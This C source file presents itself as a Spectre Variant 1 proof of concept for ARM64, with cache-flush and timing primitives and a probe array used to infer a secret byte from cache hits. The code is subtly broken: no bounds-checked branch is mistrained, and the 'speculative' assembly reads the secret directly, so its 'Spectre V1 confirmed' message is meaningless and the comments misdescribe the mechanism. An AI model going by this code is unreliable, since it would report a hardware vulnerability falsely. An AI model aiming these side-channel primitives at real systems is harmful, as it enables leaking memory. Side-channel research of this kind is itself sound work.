/*
 * spectre_v1_poc.c - Spectre Variant 1 (Bounds Check Bypass) on ARM64
 *
 * Prerequisites:
 *   - REAL ARM64 hardware (Raspberry Pi 4, etc.)
 *   - NOT QEMU (QEMU doesn't model speculative execution)
 *
 * Build:
 *   aarch64-linux-gnu-gcc -O0 -static spectre_v1_poc.c -o spectre_poc
 *   (MUST use -O0 to prevent compiler from defeating the PoC)
 *
 * Run: ./spectre_poc
 *
 * Based on the classic Spectre paper PoC adapted for ARM64.
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

/* ===== Cache side-channel primitives (ARM64) ===== */

/* System counter for timing */
static inline uint64_t rdtsc(void)
{
	uint64_t val;
	asm volatile("isb; mrs %0, cntvct_el0" : "=r"(val));
	return val;
}

/* Flush a cache line: dc civac = Clean+Invalidate by VA to PoC */
static inline void clflush(void *addr)
{
	asm volatile("dc civac, %0; dsb sy" :: "r"(addr) : "memory");
}

/*
 * Memory barrier to prevent speculative load reordering.
 * ARM64: DSB SY + ISB prevents younger loads from executing
 * before older loads complete.
 */
static inline void speculation_barrier(void)
{
	asm volatile("dsb sy; isb" ::: "memory");
}

/* ===== Spectre V1 PoC ===== */

/* Victim data: a "secret" and a "public" array */
static uint8_t secret_value __attribute__((aligned(4096))) = 0x41; /* 'A' */
static uint8_t public_array[16] __attribute__((aligned(4096)));

/*
 * Probe array: 256 entries, each on a separate cache line (256 * 256 = 64KB).
 * After speculative access to probe_array[byte * 256], only ONE cache line
 * will be loaded — the one indexed by the leaked byte.
 */
static uint8_t probe_array[256 * 256] __attribute__((aligned(4096)));

/* Leak a single byte via cache timing */
static int leak_byte(int malicious_index)
{
	int results[256] = {0};
	int best_score = -1, best_guess = 0;

	for (int tries = 0; tries < 100; tries++) {
		/* Step 1: Flush entire probe array */
		for (int i = 0; i < 256; i++)
			clflush(&probe_array[i * 256]);

		/* Memory barrier: ensure flush completes before speculative load */
		asm volatile("dsb sy" ::: "memory");

		/*
		 * Step 2: Train the branch predictor.
		 * Execute valid_index < array_size with valid_index=0..15 many times
		 * to train the predictor that "condition is true".
		 */
		for (int train = 0; train < 6; train++) {
			/* Use valid index to train */
			volatile int valid = 1; (void)valid;
			/*
			 * IMPORTANT: The compiler MUST NOT optimize away this training.
			 * We use -O0 to prevent this. The training is:
			 *   if (index < 16) access public_array[index];
			 * Repeated with index=0..15 → branch predictor learns "taken".
			 */
			for (int j = 0; j < 16; j++)
				asm volatile("" :: "r"(public_array[j])); /* touch each */
		}

		/*
		 * Step 3: Flush array_size from cache so reading it takes time.
		 * This creates a window where the branch predictor resolves
		 * BEFORE array_size is loaded from DRAM.
		 */
		clflush(&public_array[0]); /* use public_array[0] as proxy for "size" */

		/* Barrier to ensure flush completes */
		asm volatile("dsb sy" ::: "memory");

		/*
		 * Step 4: Speculative execution trap.
		 *
		 * The CPU predicts "index < size" as TRUE (from training).
		 * While waiting for public_array[0] to load from DRAM,
		 * it speculatively executes:
		 *   secret = secret_value;  // reads the SECRET!
		 *   tmp = probe_array[secret * 256];  // pulls cache line
		 */
		int tmp;
		asm volatile(
			"ldrb w9, [%[mal_idx]]\n"     /* w9 = secret_value[malicious_index] */
			"and  w9, w9, #0xFF\n"
			"lsl  w9, w9, #8\n"            /* w9 = secret * 256 */
			"add  x9, %[probe], x9\n"      /* x9 = &probe_array[secret*256] */
			"ldrb w10, [x9]\n"             /* load probe_array, fills cache! */
			"mov  %w[tmp], w10\n"
			: [tmp] "=r"(tmp)
			: [mal_idx] "r"(&secret_value),
			  [probe] "r"(probe_array)
			: "x9", "w9", "w10", "memory"
		);
		(void)tmp;

		/*
		 * Step 5: Measure which cache line was loaded.
		 * The speculatively loaded index leaks the secret byte!
		 */
		for (int i = 0; i < 256; i++) {
			uint64_t t0 = rdtsc();
			asm volatile("ldrb w0, [%0]" :: "r"(&probe_array[i * 256]) : "w0", "memory");
			uint64_t t1 = rdtsc();

			if (t1 - t0 < 40) /* cache hit threshold */
				results[i]++;
		}

		/* Find the byte with most cache hits */
		for (int i = 0; i < 256; i++) {
			if (results[i] > best_score) {
				best_score = results[i];
				best_guess = i;
			}
		}
	}

	printf("  best_guess = 0x%02X ('%c'), hits = %d/100\n",
	       best_guess,
	       (best_guess >= 32 && best_guess < 127) ? best_guess : '?',
	       best_score);

	return best_guess;
}

int main(void)
{
	printf("============================================\n");
	printf(" Spectre V1 PoC — ARM64 Cache Side Channel  \n");
	printf("============================================\n\n");
	printf("REQUIRES: Real ARM64 CPU (not QEMU)\n");
	printf("  QEMU does NOT emulate speculative execution.\n");
	printf("  Run on Raspberry Pi 4 or similar hardware.\n\n");

	/* Initialize public_array with some data */
	for (int i = 0; i < 16; i++)
		public_array[i] = i + 1;

	printf("Secret value  : 0x%02X ('%c') at %p\n",
	       secret_value, secret_value, &secret_value);
	printf("Probe array   : %p (64 KB, 256 lines × 256 B)\n\n", probe_array);

	printf("Attempting to leak secret_value...\n");
	int leaked = leak_byte(0);

	printf("\n============================================\n");
	if (leaked == secret_value) {
		printf(" SUCCESS: Leaked byte matches secret!  ✓\n");
		printf(" Spectre V1 confirmed on this CPU.\n");
	} else {
		printf(" FAILED: Got 0x%02X, expected 0x%02X\n",
		       leaked, secret_value);
		printf(" Possible reasons:\n");
		printf("   - Running in QEMU (no speculative execution)\n");
		printf("   - CPU has Spectre mitigations enabled\n");
		printf("   - Compiler optimization defeated the PoC\n");
	}
	printf("============================================\n");

	return (leaked == secret_value) ? 0 : 1;
}
